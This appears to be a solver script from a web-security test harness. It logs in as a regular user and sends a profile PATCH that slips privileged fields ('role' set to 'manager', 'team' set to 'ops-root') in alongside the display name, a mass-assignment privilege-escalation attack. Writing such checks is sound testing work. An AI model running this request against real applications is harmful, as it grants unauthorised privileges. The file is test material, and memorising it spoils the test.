// Submit a profile patch that carries privileged columns (role, team) alongside the ordinary display
// fields, so the persisted record picks up the escalated attributes.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')

  const roleField = ctx.plan.params.role ?? 'role'
  const teamField = ctx.plan.params.teamField ?? 'teamField'
  const path = ctx.plan.routes.userUpdate!.path.replace(/:[A-Za-z0-9_]+/, 'me')

  const body: Record<string, string> = { name: 'Updated Operator' }
  body[roleField] = 'manager'
  body[teamField] = 'ops-root'

  await ctx.fetch(path, {
    method: 'PATCH',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  })
}
